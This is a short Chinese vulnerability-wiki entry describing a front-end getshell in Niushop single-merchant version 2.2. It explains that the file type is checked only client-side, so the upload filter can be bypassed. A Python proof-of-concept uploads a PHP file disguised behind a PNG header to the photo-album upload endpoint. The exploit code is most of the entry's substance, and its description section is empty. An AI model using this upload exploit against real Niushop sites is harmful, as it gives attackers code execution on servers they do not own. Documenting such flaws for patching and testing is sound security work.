Niushop 单商户 2.2 前台getshell
===============================

一、漏洞简介
------------

二、漏洞影响
------------

Version：单商户 2.2

三、复现过程
------------

![](/Users/aresx/Documents/VulWiki/.resource/Niushop单商户2.2前台getshell/media/rId24.jpg)

上传图片只做了前端校验，抓包改后缀即可绕过。

对文件内容做了检查，文件大小不能过大或过小，合成马最好放到中间。

请求包截图，删除不必要的参数仍旧能够上传。

![](/Users/aresx/Documents/VulWiki/.resource/Niushop单商户2.2前台getshell/media/rId25.jpg)

所以导致**前台getshell**

### poc

    import requests

    session = requests.Session()

    paramsGet = {"s":"/wap/upload/photoalbumupload"}
    paramsPost = {"file_path":"upload/goods/","album_id":"30","type":"1,2,3,4"}
    paramsMultipart = [('file_upload', ('themin.php', "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\x0bIDAT\x08\x99c\xf8\x0f\x04\x00\x09\xfb\x03\xfd\xe3U\xf2\x9c\x00\x00\x00\x00IEND\xaeB`\x82<? php phpinfo(); ?>", 'application/octet-stream'))]
    headers = {"Accept":"application/json, text/javascript, */*; q=0.01","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0","Referer":"http://127.0.0.1/index.php?s=/admin/goods/addgoods","Connection":"close","Accept-Language":"en","Accept-Encoding":"gzip, deflate"}
    cookies = {"action":"finish"}
    response = session.post("http://127.0.0.1/index.php", data=paramsPost, files=paramsMultipart, params=paramsGet, headers=headers, cookies=cookies)

    print("Status code:   %i" % response.status_code)
    print("Response body: %s" % response.content)

参考链接
--------

> https://y4er.com/post/niushop-getshell/
